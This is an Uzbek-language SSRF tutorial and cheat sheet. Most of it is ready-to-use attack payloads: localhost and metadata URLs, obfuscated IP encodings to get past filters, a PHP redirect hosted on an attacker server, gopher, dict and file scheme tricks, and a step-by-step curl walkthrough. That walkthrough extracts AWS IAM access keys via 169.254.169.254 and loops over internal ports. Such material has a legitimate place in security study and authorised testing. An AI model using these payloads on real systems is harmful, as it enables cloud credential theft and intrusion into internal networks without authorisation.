# 🔄 SSRF (Server-Side Request Forgery — Server Tomonidan So'rov Qalbakilashtirish)

> **Maqsad:** Serverni o'zi orqali so'rov yuborishga majbur qilish — ichki tarmoq, metadata yoki boshqa servislarga kirish uchun.

---

## 📖 Asosiy Tushunchalar

### SSRF nima?
Hujumchi serverga o'zi so'rov yuborishini buyuradi. Server ichki tarmoqdan so'rov yuborganida, u tashqaridan yopiq bo'lgan resurslarga kira oladi.

**Oddiy misol:**
```
# Saytda: "URL ni kiriting, biz uni yuklaymiz"
# Normal: https://example.com/image.jpg

# SSRF hujumi:
http://localhost/admin          → Serverning o'z admin paneli
http://127.0.0.1:8080          → Ichki port
http://192.168.1.1             → Ichki tarmoq router
http://169.254.169.254         → AWS metadata server
```

### Nima uchun xavfli?
Server tashqaridan yopiq bo'lgan ichki xizmatlarni ochadi:
- Ichki admin panellar
- Bulut metadata (AWS, GCP, Azure)
- Ichki tarmoq skaneri sifatida
- Boshqa servislarga hujum

---

## 🎯 SSRF Hujum Turlari

### 1. Basic SSRF (Oddiy)
```
# Zaif parametr topildi:
https://target.com/fetch?url=https://example.com

# Hujum:
https://target.com/fetch?url=http://localhost/admin
https://target.com/fetch?url=http://127.0.0.1:22    → SSH
https://target.com/fetch?url=http://127.0.0.1:3306  → MySQL
https://target.com/fetch?url=http://127.0.0.1:6379  → Redis
```

### 2. Blind SSRF (Ko'r SSRF)
Server javobini ko'rmaymiz, lekin serverning so'rov yuborganini bilamiz.

```bash
# O'z serveringizda tinglovchi oching:
# 1. Burp Collaborator ishlating (BurpSuite Pro)
# 2. Yoki ngrok bilan:
ngrok http 8000
python3 -m http.server 8000

# Keyin payloadni yuboring:
https://target.com/fetch?url=http://YOUR_NGROK_URL/test

# Agar logda so'rov ko'rsangiz → Blind SSRF bor!
```

### 3. Cloud Metadata SSRF
Bulut serverlarida metadata xizmati mavjud.

**AWS (Amazon Web Services):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/     ← Skriptlar!
```

**GCP (Google Cloud):**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## 🚧 Filtrlarni Chetlab O'tish

### 1. IP Manzillarni Boshqacha Yozish
```bash
# 127.0.0.1 ni boshqacha yozish:
http://127.1                    # qisqartirish
http://2130706433               # decimalni (o'nlik sanoq)
http://0177.0.0.1               # oktal (sakkizlik)
http://0x7f.0.0.1               # hexadecimal
http://0x7f000001               # hex butun raqam

# localhost alternativlari:
http://localhost
http://[::1]                    # IPv6
http://[0:0:0:0:0:0:0:1]       # IPv6 to'liq
```

**Decimal konversiya:**
```bash
# 127.0.0.1 → decimal
python3 -c "import socket; print(socket.inet_aton('127.0.0.1').hex())"
# yoki oddiy hisoblash:
# 127*16777216 + 0*65536 + 0*256 + 1 = 2130706433
```

### 2. DNS orqali Chetlab O'tish
```
# O'z domeni bilan:
nip.io xizmati: 127.0.0.1.nip.io → 127.0.0.1 ga yechiladi
ssrf.test.example.com            → DNS 127.0.0.1 ga o'rnating

# xip.io:
http://127.0.0.1.xip.io
```

### 3. HTTP Redirect
```
# O'z serveringizda redirect o'rnating:
# redirect.php:
<?php header("Location: http://127.0.0.1/admin"); ?>

# Keyin:
https://target.com/fetch?url=http://your-server.com/redirect.php
```

### 4. URL sxema alternativlari
```
dict://127.0.0.1:11211/     → Memcached
gopher://127.0.0.1:3306/    → MySQL (maxsus payload kerak)
file:///etc/passwd           → Fayl o'qish (agar ruxsat bo'lsa)
```

---

## 🔍 SSRF Topish

### Tekshirilishi kerak bo'lgan parametrlar:
```
?url=
?uri=
?path=
?dest=
?redirect=
?target=
?src=
?source=
?file=
?link=
?page=
?proxy=
?host=
?endpoint=
?webhook=
?callback=
```

### POST so'rovlarda:
```json
{"url": "https://example.com"}
{"image_url": "https://example.com/img.jpg"}
{"callback": "https://example.com/hook"}
{"webhook_url": "https://example.com/notify"}
```

---

## 🎯 Amaliy Misol

```bash
# 1-qadam: SSRF parametrini topish
# Saytni aylanib, URL qabul qiladigan joylarni top:
# - Rasm yuklash (URL orqali)
# - PDF yaratish
# - Webhook sozlamalari
# - Import funksiyasi

# 2-qadam: Localhost tekshirish
curl "https://target.com/api/fetch?url=http://127.0.0.1"
curl "https://target.com/api/fetch?url=http://localhost"

# 3-qadam: AWS metadata
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# Natija: hostname, instance-type, iam/...

# 4-qadam: IAM credentials olish
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Natija: RoleName
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName"
# Natija: AccessKeyId, SecretAccessKey, Token!

# 5-qadam: Ichki portlarni skan qilish
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/fetch?url=http://127.0.0.1:$port")
  echo "Port $port: HTTP $response"
done
```

---

## 💡 Eslab Qolish Uchun

| Maqsad | Payload |
|--------|---------|
| Localhost | `http://127.0.0.1` yoki `http://localhost` |
| AWS metadata | `http://169.254.169.254/latest/meta-data/` |
| Fayl o'qish | `file:///etc/passwd` |
| Ichki port | `http://127.0.0.1:PORT` |
| Filtr bypass | `http://127.1` yoki `http://2130706433` |

- **SSRF** = Server o'zi orqali so'rov yuboradi
- `169.254.169.254` = AWS/GCP metadata sehrli manzili
- Blind SSRF = Javob ko'rinmaydi, lekin so'rov yetadi (Burp Collaborator)
- `?url=`, `?webhook=`, `?src=` — SSRF uchun asosiy parametrlar
